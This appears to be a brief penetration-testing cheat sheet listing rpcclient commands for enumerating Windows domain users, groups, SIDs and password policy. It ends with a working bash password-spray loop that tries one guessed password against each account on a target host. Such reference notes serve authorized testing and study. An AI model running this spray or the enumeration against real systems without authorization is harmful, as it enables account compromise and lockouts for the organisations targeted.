## User Enum

- **List users**: `querydispinfo` and `enumdomusers`
- **Get user details**: `queryuser <0xrid>`
- **Get user groups**: `queryusergroups <0xrid>`
-   **GET SID of a user**: `lookupnames <username>`


## Groups enumeration

-   **List groups**: `enumdomgroups`
-   **Get group details**: `querygroup <0xrid>`
-   **Get group members**: `querygroupmem <0xrid>`

## Password

- **Password Policy Info**: `getdompwinfo`
- **Password Spray**: 
```bash
for u in $(cat users.txt); do
	echo -n "[*] user: $u";
	rpcclient -U "$u%Autumn2015" -c "getusernam; quit" $IP
done
```